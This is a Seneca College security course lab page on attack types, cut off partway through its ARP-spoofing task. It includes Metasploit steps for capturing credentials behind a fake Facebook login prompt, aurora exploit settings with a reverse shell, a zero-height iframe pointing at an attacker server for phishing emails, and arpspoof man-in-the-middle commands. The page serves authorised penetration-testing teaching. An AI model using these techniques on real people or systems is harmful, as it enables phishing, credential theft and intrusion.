<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-A-Labs/lab4">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-rc.1">
<link rel="icon" href="/SEC520/img/pwa/icon-512x512.png">
<link rel="manifest" href="/SEC520/manifest.json">
<meta name="theme-color" content="#DA291C">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#DA291C">
<link rel="apple-touch-icon" href="/SEC520/img/pwa/icon-192x192.png">
<link rel="mask-icon" href="/SEC520/img/pwa/icon-512x512.png" color="#DA291C">
<meta name="msapplication-TileImage" content="/SEC520/img/pwa/icon-512x512.png">
<meta name="msapplication-TileColor" content="#DA291C">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><title data-rh="true">Lab 4 | SEC520 - Internet Security</title><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://Seneca-ICTOER.github.io//SEC520/A-Labs/lab4"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Lab 4 | SEC520 - Internet Security"><meta data-rh="true" name="description" content="Lab 4 for Students to Complete and Submit"><meta data-rh="true" property="og:description" content="Lab 4 for Students to Complete and Submit"><link data-rh="true" rel="icon" href="/SEC520/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://Seneca-ICTOER.github.io//SEC520/A-Labs/lab4"><link data-rh="true" rel="alternate" href="https://Seneca-ICTOER.github.io//SEC520/A-Labs/lab4" hreflang="en"><link data-rh="true" rel="alternate" href="https://Seneca-ICTOER.github.io//SEC520/A-Labs/lab4" hreflang="x-default"><link rel="stylesheet" href="/SEC520/assets/css/styles.099fe1a9.css">
<link rel="preload" href="/SEC520/assets/js/runtime~main.5ac39f4d.js" as="script">
<link rel="preload" href="/SEC520/assets/js/main.7a6e0794.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_fXgn">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><a class="navbar__brand" href="/SEC520/"><div class="navbar__logo"><img src="/SEC520/img/logo.svg" alt="Seneca College" class="themedImage_ToTc themedImage--light_HNdA"><img src="/SEC520/img/logo-dark.svg" alt="Seneca College" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">SEC520 - Internet Security</b></a></div><div class="navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebar_njMd"><nav class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/SEC520/">Welcome to SEC520</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/SEC520/weekly-schedule">Weekly Schedule</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/SEC520/A-Labs/lab1">Labs</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/SEC520/A-Labs/lab1">Lab 1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/SEC520/A-Labs/lab2">Lab 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/SEC520/A-Labs/lab3">Lab 3</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/SEC520/A-Labs/lab4">Lab 4</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/SEC520/A-Labs/lab5">Lab 5</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/SEC520/A-Labs/lab6">Lab 6</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/SEC520/A-Labs/lab7">Lab 7</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/SEC520/A-Labs/lab8">Lab 8</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/SEC520/B-Assignments/assignment1">Assignments</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/SEC520/C-ExtraResources/course-policies">Extra Resources</a></div></li></ul></nav></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/SEC520/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_OVgt"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Labs</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Lab 4</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Lab 4</h1><h2 class="anchor anchorWithStickyNavbar_LWe7" id="types-of-attacks">Types of Attacks<a class="hash-link" href="#types-of-attacks" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a class="hash-link" href="#introduction" title="Direct link to heading">​</a></h3><p>In the previous lab, you learned how to perform penetration testing on a vulnerable (target) server. You learned how to perform scanning and enumeration, and then ran vulnerability testing software (eg. Metasploit) to gain access to your Windows server.</p><p>In this lab, students will learn <strong>other methods of vulnerability testing</strong> to gain access to vulnerable servers:</p><ul><li>This lab will allow students to identify and practice common types of attacks that occur on targeted computer systems.</li><li>First, students will be exposed to <strong>Client-side</strong> attacks (usually initiated by the server&#x27;s users) including <strong>Malicious web-page Payloads</strong>, and <strong>IP Spoofing</strong> (Man in the Middle) attacks.</li><li>Then, students will focus on <strong>Server-side</strong> attacks such as <strong>Server-side Injection</strong>, and <strong>Password</strong> attacks.</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="objectives">Objectives<a class="hash-link" href="#objectives" title="Direct link to heading">​</a></h3><ol><li>Access a server by creating a webpage using the <strong>&lt;iframe<!-- -->&gt;</strong> tag to redirect a user to a <strong>Metasploit exploit</strong> in order to gain access to the computer system.</li><li>Understand how <strong>phishing</strong> can be used to have the user inadvertantly activate (trigger) HTML code to access a vulnerable server via a web-browser.</li><li>Perform <strong>IP Spoofing</strong> (Man in the Middle) attacks in order to obtain useful information between a connect between computers.</li><li>Access and manipulate a database server to gain access into the targeted server.</li><li>Use a <strong>password cracking program</strong> to discover and access user accounts, and possibly root access.</li></ol><h3 class="anchor anchorWithStickyNavbar_LWe7" id="required-materials-bring-to-all-labs">Required Materials (Bring to All Labs)<a class="hash-link" href="#required-materials-bring-to-all-labs" title="Direct link to heading">​</a></h3><ul><li><strong>SATA Hard Disk</strong> (in removable disk tray).</li><li><strong>Lab Logbook (Lab6 Reference Sheet)</strong> (to make notes and observations).</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="prerequisites">Prerequisites<a class="hash-link" href="#prerequisites" title="Direct link to heading">​</a></h3><ul><li><a href="/SEC520/A-Labs/lab3">SEC520 Lab 3</a></li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="online-tools-and-references">Online Tools and References<a class="hash-link" href="#online-tools-and-references" title="Direct link to heading">​</a></h3><ul><li><a href="http://www.ehacking.net/2011/10/metasploit-tutorials-from-beginner-to.html" target="_blank" rel="noopener noreferrer">Metasploit Framework</a></li><li><a href="http://www.irongeek.com/i.php?page=security/arpspoof" target="_blank" rel="noopener noreferrer">arpspoof</a></li><li><a href="http://arhodes505.awardspace.us/minituts/xhydra.htm" target="_blank" rel="noopener noreferrer">xhydra</a></li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="course-notes">Course Notes<a class="hash-link" href="#course-notes" title="Direct link to heading">​</a></h3><ul><li><a target="_blank" href="/SEC520/assets/files/sec520_w7_l1-70c19386f82aa56e61ade6d22abd8ac9.odp">odp</a> | <a target="_blank" href="/SEC520/assets/files/sec520_w7_l1-97a23e786b158de6a65fec9e80b3672f.pdf">pdf</a> | <a target="_blank" href="/SEC520/assets/files/sec520_w7_l1-4812e49545c47ef93a373b966f913c89.ppt">ppt</a> (Slides: Types of Attacks)</li><li><a href="http://www.youtube.com/watch?v=ZUygX8TBBw0" target="_blank" rel="noopener noreferrer">Phishing</a> | <a href="http://www.youtube.com/watch?v=PqfZM3Lxrmg" target="_blank" rel="noopener noreferrer">Malicious Payload</a> | <a href="http://www.youtube.com/watch?v=-hd7XG-b6uk" target="_blank" rel="noopener noreferrer">IP Spoofing</a> | <a href="http://www.youtube.com/watch?v=AhTfo6pWBIM" target="_blank" rel="noopener noreferrer">Database Injection</a> (YouTube Videos)</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="performing-lab-4">Performing Lab 4<a class="hash-link" href="#performing-lab-4" title="Direct link to heading">​</a></h2><p><strong>CAUTION!</strong></p><p>Scanning ports and exploiting servers must
require the permission of Server Owner (preferably in writing). Students</p><p>must either use their VMs, use the IFS lab (if available), or sign an agreement to use the <strong>Tank</strong> server when practising these computer system intrusion methods.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1-web-browser-redirect-phishing-attacks">Task #1: Web-browser Redirect (Phishing) Attacks<a class="hash-link" href="#task-1-web-browser-redirect-phishing-attacks" title="Direct link to heading">​</a></h3><p>This section will demonstrate the vulnerability of a computer system with one of its weakest links: <em>Humans</em>. You will be using the <strong>Metasploit</strong> framework to create an attack on your server that will <em>exploit</em> and <em>gain access</em> to your target machine. You will also learn how you can redirect users to this attack site to deliver the malicious payload to that targeted computer.</p><p><strong>INSTRUCTIONS:</strong></p><p>Metasploit is a very versatile tool for penetration testing. In addition to gaining access to &quot;targeted&quot; computer systems by using the <strong>Armitage</strong> frontend, other strategies such as <em>lurking</em> to gain access (via reverse shell) by redirecting web-browser traffic are also available.</p><p>In this section, we will be using the mfs-console to issue commands to exploit via the web-browser. Before we start, we should update our Metasploit Framework. In order to achieve this, we will update the older version of Metasploit that came with our Kali Linux edition with a new version:</p><p><strong>Using The MSF Console</strong></p><p><strong>msfconsole</strong> is a shell that allows penetration testers to issue commands when working with Metasploit. For example, IFS students in the degree program are expected to perform penetration testing more in the msfconsole than using Metasploit GUIs like Armatage!</p><p>We will be running the <strong>msfconsole</strong> command to access the command shell, and setup a typical phishing attack.</p><ol><li><p>Login as <strong>root</strong> user, and issue the command: <code>msfconsole</code> (ignore error, console should eventually load). If problems persist check to see if the Metasploit server is running.</p><ul><li>Next, we will be generating an attack payload (code) that can be executed from an html file (via a form button) to gain access to the computer system. Perform the following steps to create this payload (html) file:</li></ul></li><li><p>In the <strong>msfconsole</strong>, issue the following commands:</p></li></ol><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  use auxiliary/server/capture/http_basic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token builtin class-name">set</span><span class="token plain"> REALM Facebook Gateway</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token builtin class-name">set</span><span class="token plain"> URIPATH /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="3"><li>Note the <strong>LOCAL IP ADDRESS</strong>. You will be entering that address in a web-browser on your targeted Windows server.</li><li>Your attack server (running Metasploit) is now &quot;lurking&quot; until the user enters data in a windows dialog box.</li></ol><p><strong>Disable Internet Explorer Enhanced Security:</strong> In order to demonstrate this attack, we will disable Internet Explorer Enhanced Security. Perform the instructions below to disable this feature.</p><ol start="5"><li>Switch to your vulnerable Windows server, make certain that you are logged in as <strong>Administrator</strong>.</li><li>Open the <strong>Control Panel</strong>, select <strong>Add or Remove Programs</strong>, select <strong>Add/Remove Windows Components</strong>. Click to select <strong>Internet Explorer Enhanced Security Configuration</strong> and click <strong>Details</strong>. Unclick the checkboxes for admin and all other users and then click <strong>Next</strong>.</li><li>Login into a regular user account and open a web-browser.</li><li>Enter the IP ADDRESS for the attack web-site. Enter a username and password when prompted by the dialog box</li><li>Now, switch to your attack machine (i.e. host), and you should see a notification of the exploit. Where you able to determine the username and password?</li><li>Did you think it would be harder to exploit a machine in this way?</li><li>How popular do you think this type of human-based attack is?</li><li>How can you prevent this type of attack from occurring on a &quot;hardened system&quot;?</li><li>Record your findings in your lab log-book.</li></ol><p><strong>The Phishing Attack (For Interest Only)</strong></p><p><strong>WARNING! Only try this for penetration testing on your VMs or on servers that you have permission to perform penetration testing!</strong></p><p>Only You have created a mechanism to gain access to a vulnerable system by using the targeted system&#x27;s web-browser. All the <strong>penetration tester</strong> needs to do, is to set an <strong>elaborate &quot;trap&quot; to redirect the user to your host&#x27;s IP_ADDRESS</strong>, disguised as a regular link.</p><p>Here is how simple (subtle) it can be:</p><ol><li><p>Perform a Google search to use msfconsole to setup a &quot;reverse shell attack&quot; by entering the console commands:</p><ul><li>use windows/browser/ms10_002_aurora</li><li>set generic/shell_reverse tcp</li><li>set LHOST (your attack host IP ADDRESS)</li><li>set URIPATH /</li><li>set LPORT 7371</li><li>set SRVPORT 80</li><li>exploit</li></ul></li><li><p>Create a &quot;phony&quot; facebook notification for the &quot;targeted&quot; user on the system (this is where the reconnaissance (information gathering) phase comes in handy such as e-mail usernames and facebook accounts.</p></li><li><p>Here is a link to sample HTML code: <a href="https://scs.senecac.on.ca/~fac/sec520/labs/email-attachment-template.html.txt" target="_blank" rel="noopener noreferrer">Template of e-mail attachment</a></p></li><li><p>Edit the file to contain the following iframe (that will draw the user to your attack website):</p></li></ol><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">iframe</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">ATTACK_SERVER_IP_ADDRESS</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">width</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">100</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">height</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">0</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">iframe</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="5"><li><p>We could then send this HTML file via an e-mail to the user (in this case masquerading as a facebook notification. You could simulate this attack for demonstration by creating the html file in your Windows server, and load this file with a web-browser (like Internet Explorer).</p><ul><li>Another approach would be to send a &quot;phony&quot; notification with links to the facebook &quot;login&quot; page with the &lt;iframe<!-- -->&gt;<!-- --> element.</li></ul></li><li><p>Proceed to Task #2</p></li></ol><p><strong>Answer the Task #1 observations / questions in your lab log book.</strong></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2-ip-spoofing-man-in-the-middle-attacks--packet-sniffing">Task #2: IP Spoofing (Man in the Middle) Attacks / Packet Sniffing<a class="hash-link" href="#task-2-ip-spoofing-man-in-the-middle-attacks--packet-sniffing" title="Direct link to heading">​</a></h3><p>This section will demonstrate an <strong>IP Spoofing</strong> attack (sometimes referred to as &quot;<em>arp poisoning</em>&quot;) where the target server is &quot;tricked&quot; into communicating with a server that assumes has the correct MAC address. The attacker can then &quot;<strong>feed packets</strong>&quot; to the destination allowing for an uninterupted session to obtain information such as usernames and passwords.</p><p><strong>INSTRUCTIONS:</strong></p><ol><li>We will be using your <strong>Kali Linux</strong> host machine, <strong>Vulnerable Windows VM</strong>, and <strong>Vulnerable Linux VM</strong> for this section.</li><li>Note the IP Address of your Windows server.</li><li>Make certain that your Windows machine is running an FTP server. Set up the FTP server to only allow users to access the FTP server by username and password (possibly not required from default installation and startup).</li><li>For demonstration purposes of this &quot;man in the middle&quot; attack, open a command prompt, and issue the following MS-Windows command:</li></ol><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ping</span><span class="token plain"> LINUX_IP_ADDR -t</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li>You should now see proof of a connection between your vulnerable Windows and Linux servers.</li></ul><ol start="5"><li>Switch to your vulnerable Linux server, open a shell terminal, and note the IP Address of your vulnerable Linux server.</li><li>Open another shell terminal, and issue the following Linux command to continuously &quot;ping&quot; the Windows server:</li></ol><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ping</span><span class="token plain"> WINDOWS_IP_ADDR</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="7"><li>We will now trick the Windows server into thinking that the attack (Kali Linux or &quot;host&quot;) server is the destination server.</li><li>Switch to your Kali Linux (host) server, and open a shell terminal.</li><li>While in the host (attack) machine, issue the following Linux command:</li></ol><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> arpspoof -t WINDOWS_IP_ADDR LINUX_IP_ADDR</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="10"><li>We need to continue the &quot;man in the middle&quot; attack by now performing the same manuever for the Linux VM. While still in the host (attack) machine, open another shell terminal and issue the following Linux command:</li></ol><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> arpspoof -t LINUX_IP_ADDR_LINUX WINDOWS_IP_ADDR</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="11"><li>Switch to first your vulnerable Windows machine to view the pings. What do you notice? Do the same for your vulnerable Linux machine. Record your findings in your lab log-book.</li></ol><p><strong>Connection Disconnected:</strong> When initionally performing an &quot;IP Spoof&quot;, the connection between the machines is temporary broken. In order to re-establish a connection (via the &quot;man in the middle&quot;) the attacker must establish <strong>IP FORWARDING</strong>.</p><ol start="12"><li>To complete the &quot;man in the middle&quot; attack, you are required to establish <strong>IP FORWARDING</strong>. Open another shell window in your host (attack) machine, and issue the following Linux command in your attack host:</li></ol><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">su</span><span class="token plain">           </span><span class="token comment" style="color:#999988;font-style:italic"># login with admin passord</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token 